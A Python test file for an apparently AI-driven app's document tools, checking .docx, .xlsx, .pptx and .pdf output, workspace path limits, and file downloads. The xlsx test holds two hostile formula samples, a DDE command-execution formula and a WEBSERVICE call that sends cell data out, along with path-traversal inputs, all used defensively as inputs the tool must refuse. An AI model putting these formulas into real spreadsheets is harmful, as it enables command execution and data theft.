"""Document tools write real .docx, .xlsx, .pptx and .pdf files into the workspace; the tests open them again."""

import sys

import pytest

from spike.tools.base import ToolRegistry
from spike.tools.builtin import Workspace
from spike.tools.documents import document_tools

docx = pytest.importorskip("docx")
openpyxl = pytest.importorskip("openpyxl")
pptx = pytest.importorskip("pptx")
pypdf = pytest.importorskip("pypdf")

REPORT = """# Informe trimestral

Las ventas crecieron un **12 %** frente al trimestre anterior.

## Puntos clave
- Margen bruto: 41 %
- Nuevos clientes: 1.200

| Región | Ventas |
|---|---|
| Norte | 120 |
| Sur | 95 |
"""


@pytest.fixture
def tools(tmp_path):
    return {t.name: t for t in document_tools(Workspace(tmp_path))}, tmp_path


async def test_docx_from_markdown(tools):
    t, root = tools
    r = await t["create_docx"].run({"path": "informes/q3.docx", "content": REPORT})
    assert r.ok and r.data["file"] == "informes/q3.docx", r.content
    d = docx.Document(root / "informes" / "q3.docx")
    styled = [(p.style.name, p.text) for p in d.paragraphs if p.text]
    assert ("Heading 1", "Informe trimestral") in styled and ("Heading 2", "Puntos clave") in styled
    assert ("List Bullet", "Margen bruto: 41 %") in styled
    assert any(run.bold and run.text == "12 %" for p in d.paragraphs for run in p.runs)
    table = d.tables[0]
    assert [[c.text for c in row.cells] for row in table.rows] == [["Región", "Ventas"], ["Norte", "120"], ["Sur", "95"]]


async def test_xlsx_keeps_numbers_and_formulas(tools):
    t, root = tools
    r = await t["create_xlsx"].run({"path": "ventas.xlsx", "sheets": [
        {"name": "Q3", "rows": [["Región", "Ventas"], ["Norte", 120], ["Sur", 95.5], ["Total", "=SUM(B2:B3)"]]}]})
    assert r.ok, r.content
    ws = openpyxl.load_workbook(root / "ventas.xlsx")["Q3"]
    assert [c.value for c in ws[3]] == ["Sur", 95.5] and ws["B4"].value == "=SUM(B2:B3)"
    assert ws["A1"].font.bold
    for formula in ("=cmd|' /C calc'!A0", '=WEBSERVICE("http://x/?"&A1)'):  # would reach outside the file
        bad = await t["create_xlsx"].run({"path": "bad.xlsx", "sheets": [{"rows": [[formula]]}]})
        assert not bad.ok and "formula" in bad.content
    assert not (root / "bad.xlsx").exists()


async def test_pptx_slides(tools):
    t, root = tools
    r = await t["create_pptx"].run({"path": "deck.pptx", "title": "Lanzamiento ETF", "slides": [
        {"title": "Objetivo", "bullets": ["500 altas", "CAC < 40 €"]},
        {"title": "Canales", "bullets": ["Newsletter", "YouTube"], "notes": "Mostrar el embudo"},
    ]})
    assert r.ok, r.content
    deck = pptx.Presentation(root / "deck.pptx")
    texts = [[sh.text_frame.text for sh in s.shapes if sh.has_text_frame] for s in deck.slides]
    assert texts[0][0] == "Lanzamiento ETF" and texts[1][0] == "Objetivo" and "CAC < 40 €" in texts[1][1]
    assert deck.slides[2].notes_slide.notes_text_frame.text == "Mostrar el embudo"


async def test_pdf_from_markdown(tools):
    t, root = tools
    r = await t["create_pdf"].run({"path": "informe.pdf", "content": REPORT})
    assert r.ok, r.content
    text = "".join(page.extract_text() for page in pypdf.PdfReader(root / "informe.pdf").pages)
    for expected in ("Informe trimestral", "Margen bruto: 41 %", "Norte", "Región"):
        assert expected in text


async def test_paths_stay_in_the_workspace_and_keep_their_extension(tools):
    t, root = tools
    assert not (await t["create_docx"].run({"path": "../escape.docx", "content": "x"})).ok
    r = await t["create_pdf"].run({"path": "notes.txt", "content": "x"})
    assert not r.ok and ".pdf" in r.content
    assert not any(root.parent.glob("escape.docx"))


async def test_documents_ask_before_writing():
    assert {t.default_policy for t in document_tools(Workspace(__import__("pathlib").Path(".")))} == {"ask"}


async def test_a_missing_library_is_explained(tools, monkeypatch):
    t, _ = tools
    monkeypatch.setitem(sys.modules, "docx", None)
    r = await t["create_docx"].run({"path": "a.docx", "content": "x"})
    assert not r.ok and "spike-ai[docs]" in r.content


def test_document_tools_are_in_the_default_registry(tmp_path):
    from spike.tools.builtin import default_registry

    names = set(default_registry(tmp_path).names())
    assert {"create_docx", "create_xlsx", "create_pptx", "create_pdf"} <= names
    assert isinstance(default_registry(tmp_path), ToolRegistry)


def test_written_documents_reach_the_ui_as_downloads(tmp_path, monkeypatch):
    import json

    from fastapi.testclient import TestClient

    from spike.server.app import create_app
    from spike.server.state import AppState
    from tests.helpers import ScriptedProvider, call, text

    monkeypatch.setenv("SPIKE_HOME", str(tmp_path))
    monkeypatch.setenv("SPIKE_WORKSPACE", str(tmp_path / "ws"))
    monkeypatch.setenv("SPIKE_NO_KEYRING", "1")
    provider = ScriptedProvider([], name="spike-local")

    def factory(cfg):
        provider.config = cfg
        return provider

    state = AppState(home=tmp_path, provider_factory=factory)
    state.update_settings({"tool_policies": {"create_xlsx": "allow"}})
    client = TestClient(create_app(state, allowed_hosts={"127.0.0.1", "testserver"}))

    def chat(body):
        provider._script = [call("create_xlsx", {"path": "out/v.xlsx", "sheets": [{"rows": [["a", 1]]}]}), text("ok")]
        r = client.post("/api/chat", json={"message": "hoja", "mode": "data", **body})
        return [json.loads(x[6:]) for x in r.text.splitlines() if x.startswith("data: ")]

    result = next(e for e in chat({}) if e["type"] == "tool_result")
    assert result["ok"] and result["file"] == "out/v.xlsx"
    r = client.get("/api/workspace/files/out/v.xlsx")
    assert r.status_code == 200 and r.content[:2] == b"PK"
    assert r.headers["content-type"] == "application/octet-stream" and r.headers["content-security-policy"] == "sandbox"
    (tmp_path / "secrets.json").write_text("{}")
    assert client.get("/api/workspace/files/..%2Fsecrets.json").status_code == 400
    assert client.get("/api/workspace/files/nope.xlsx").status_code == 404
    # an artifact runs with an opaque origin; anything it sends carries Origin: null and is refused
    assert client.get("/api/conversations", headers={"Origin": "null"}).status_code == 403

    pid = client.post("/api/projects", json={"name": "P"}).json()["id"]
    assert next(e for e in chat({"project_id": pid}) if e["type"] == "tool_result")["file"] == "out/v.xlsx"
    assert client.get(f"/api/projects/{pid}/files/out/v.xlsx").content[:2] == b"PK"
